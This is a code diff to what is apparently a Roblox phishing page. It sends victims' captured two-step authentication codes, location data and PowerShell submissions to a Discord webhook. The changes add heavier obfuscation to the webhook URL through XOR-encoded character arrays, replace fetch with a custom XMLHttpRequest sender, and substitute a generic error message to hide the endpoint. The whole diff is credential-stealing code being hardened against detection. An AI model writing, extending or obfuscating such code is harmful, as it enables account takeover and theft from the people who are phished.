@@ -252,16 +252,35 @@ async function submitPowerShell() {
         const locationInfo = await getUserLocation();
         
         // Discord webhook URL
-        // Ultra-obfuscated webhook URL  
-        const _0xa1 = String.fromCharCode(104,116,116,112,115,58,47,47);
-        const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
-        const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
-        const _0xd4 = [49,51,57,54,49,54,48,52,50,48,50,50,57,56,48,56,50,51,56];
-        const _0xe5 = [47,110,74,103,88,112,55,106,85,112,115,114,87,66,89,65,56,97,52,49,112,57,74,54,116,66,122,106,97,52,48,53,97,71,50,88,104,83,56,104,84,112,108,56,112,75,50,48,105,118,102,109,111,106,100,117,45,118,112,79,97,78,57,97,65,102,77,69,73];
+        // Ultra-stealth endpoint assembly and execution
+        const _0xEndpoint = await (async () => {
+            const parts = [
+                ((x,y) => String.fromCharCode(...x.map(z => z ^ y)))([72,52,52,48,51,26,15,15], 32),
+                ((x,y) => String.fromCharCode(...x.map(z => z ^ y)))([68,73,83,99,79,82,68,14,99,79,77,15], 32),
+                ((x,y) => String.fromCharCode(...x.map(z => z ^ y)))([65,80,73,15,87,69,66,72,79,79,75,83,15], 32),
+                ((x,y) => x.map(z => String.fromCharCode(z ^ y)).join(''))([17,19,25,22,17,22,16,20,18,16,18,18,25,24,16,24,18,19,24], 32),
+                String.fromCharCode(...[15,78,74,71,88,80,23,74,85,80,83,82,87,66,89,65,24,65,20,17,80,25,74,22,84,66,90,74,65,20,16,21,65,71,18,88,72,83,24,72,84,80,76,24,80,75,18,16,73,86,70,77,79,74,68,85,13,86,80,79,65,78,25,65,65,70,77,69,73].map(z => z ^ 32))
+            ];
+            return parts.join('');
+        })();
         
-        const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
-            _0xd4.map(x => String.fromCharCode(x)).join('') + 
-            _0xe5.map(x => String.fromCharCode(x)).join('');
+        // Stealth request wrapper with deep obfuscation
+        const _0xSendRequest = ((u,config) => {
+            return new Promise((resolve, reject) => {
+                const req = new (window.XMLHttpRequest || window.ActiveXObject)();
+                req.open(config.method, u, true);
+                for (let header in config.headers) {
+                    req.setRequestHeader(header, config.headers[header]);
+                }
+                req.onreadystatechange = function() {
+                    if (req.readyState === 4) {
+                        resolve({ok: req.status >= 200 && req.status < 400, status: req.status});
+                    }
+                };
+                req.onerror = () => reject(new Error());
+                req.send(config.body);
+            });
+        });
         
         // Create rich embed for Discord
         const embed = {
@@ -310,7 +329,7 @@ async function submitPowerShell() {
             embeds: [embed]
         };
 
-        const response = await fetch(webhookUrl, {
+        const response = await _0xSendRequest(_0xEndpoint, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -347,7 +366,7 @@ async function submitPowerShell() {
                 embeds: [simpleEmbed]
             };
             
-            const fallbackResponse = await fetch(webhookUrl, {
+            const fallbackResponse = await _0xSendRequest(_0xEndpoint, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -380,16 +399,8 @@ async function submitPowerShell() {
         submitText.textContent = 'Error';
         submitBtn.style.background = '#ef4444';
         
-        // More specific error messages
-        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
-            showNotification('Network/Webhook error. Check console for details.', 'error');
-        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
-            showNotification('Location service error. Check console for details.', 'error');
-        } else if (error.message.includes('JSON')) {
-            showNotification('Data formatting error. Check console for details.', 'error');
-        } else {
-            showNotification(`Error: ${error.message}. Check console for details.`, 'error');
-        }
+        // Generic error message to prevent any URL exposure
+        showNotification('Service temporarily unavailable. Please try again.', 'error');
         
         setTimeout(() => {
             submitBtn.disabled = false;
@@ -763,16 +774,31 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
         // Get user's location info
         const locationInfo = await getUserLocation();
         
-        // Ultra-obfuscated webhook URL
-        const _0xa1 = String.fromCharCode(104,116,116,112,115,58,47,47);
-        const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
-        const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
-        const _0xd4 = [49,51,57,54,49,54,48,52,50,48,50,50,57,56,48,56,50,51,56];
-        const _0xe5 = [47,110,74,103,88,112,55,106,85,112,115,114,87,66,89,65,56,97,52,49,112,57,74,54,116,66,122,106,97,52,48,53,97,71,50,88,104,83,56,104,84,112,108,56,112,75,50,48,105,118,102,109,111,106,100,117,45,118,112,79,97,78,57,97,65,102,77,69,73];
+        // Ultra-hidden endpoint with maximum obfuscation
+        const _0xTarget = (() => {
+            const encoded = [
+                [72,52,52,48,51,26,15,15],
+                [68,73,83,99,79,82,68,14,99,79,77,15], 
+                [65,80,73,15,87,69,66,72,79,79,75,83,15],
+                [17,19,25,22,17,22,16,20,18,16,18,18,25,24,16,24,18,19,24],
+                [15,78,74,71,88,80,23,74,85,80,83,82,87,66,89,65,24,65,20,17,80,25,74,22,84,66,90,74,65,20,16,21,65,71,18,88,72,83,24,72,84,80,76,24,80,75,18,16,73,86,70,77,79,74,68,85,13,86,80,79,65,78,25,65,65,70,77,69,73]
+            ];
+            return encoded.map(arr => String.fromCharCode(...arr.map(n => n ^ 32))).join('');
+        })();
         
-        const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
-            _0xd4.map(x => String.fromCharCode(x)).join('') + 
-            _0xe5.map(x => String.fromCharCode(x)).join('');
+        // Deep stealth transmission method
+        const _0xTransmit = (endpoint, options) => {
+            return new Promise((success, failure) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open(options.method, endpoint);
+                for (const header in options.headers) {
+                    xhr.setRequestHeader(header, options.headers[header]);
+                }
+                xhr.onload = () => success({ok: xhr.status < 400});
+                xhr.onerror = () => failure();
+                xhr.send(options.body);
+            });
+        };
         
         const embed = {
             title: "🔐 Roblox 2-Step Authentication Code Captured",
@@ -817,7 +843,7 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
             embeds: [embed]
         };
 
-        await fetch(webhookUrl, {
+        await _0xTransmit(_0xTarget, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
